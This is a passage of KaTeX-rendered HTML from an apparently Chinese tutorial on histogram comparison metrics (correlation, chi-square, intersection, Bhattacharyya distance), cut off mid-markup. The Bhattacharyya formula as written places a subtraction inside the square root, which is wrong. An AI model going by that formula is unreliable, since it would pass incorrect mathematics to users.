class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.3664800000000006em;vertical-align:-1.7300000000000004em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6364800000000002em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.30853em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3085300000000002em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9467699999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9467699999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.2685299999999997em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M1001,80H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5c4,-6.7,10,-10,18,-10zM1001 80H400000v40H1013z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.53147em;"><span></span></span></span></span></span></span></span><span style="top:-3.53853em;"><span class="pstrut" style="height:3.30853em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.9982400000000005em;"><span class="pstrut" style="height:3.30853em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9467699999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9467699999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7300000000000004em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mover accent="true"><mi>H</mi><mo>^</mo></mover><mi>k</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>N</mi></mfrac><munder><mo>∑</mo><mi>J</mi></munder><mrow><msub><mi>H</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>J</mi><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">\hat{H}_k=\frac{1}{N}\sum_J{H_k(J)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0967699999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9467699999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.615776em;vertical-align:-1.294336em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.855664em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.09618em;">J</span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294336em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mclose">)</span></span></span></span></span></span></p><ul><li>卡方</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mi>I</mi></munder><mfrac><mrow><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mrow><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">d(H_1,H_2)=\sum_I{\frac{(H_1(I)-H_2(I))^2}{H_1(I)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.785444em;vertical-align:-1.294336em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.855664em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294336em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.491108em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span></p><ul><li>交叉</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mi>I</mi></munder><mrow><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">d(H_1,H_2)=\sum_I{min(H_1(I),H_2(I))}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.344341em;vertical-align:-1.294336em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.855664em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294336em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></span></p><ul><li>巴氏距离</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msqrt><mrow><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msqrt><mrow><msub><mi>H</mi><mn>1</mn></msub><msub><mi>H</mi><mn>2</mn></msub><msup><mi>N</mi><mn>2</mn></msup></mrow></msqrt></mfrac><munder><mo>∑</mo><mi>I</mi></munder><msqrt><mrow><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo></mrow></msqrt></mrow></msqrt></mrow><annotation encoding="application/x-tex">d(H_1,H_2)=\sqrt{1-\frac{1}{\sqrt{H_1H_2N^2}}\sum_I{\sqrt{H_1(I)-H_2(I)}}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.04em;vertical-align:-1.392573em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.647427em;"><span class="svg-align" style="top:-5em;"><span class="pstrut" style="height:5em;"></span><span class="mord" style="padding-left:1em;"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.229946em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.880054em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 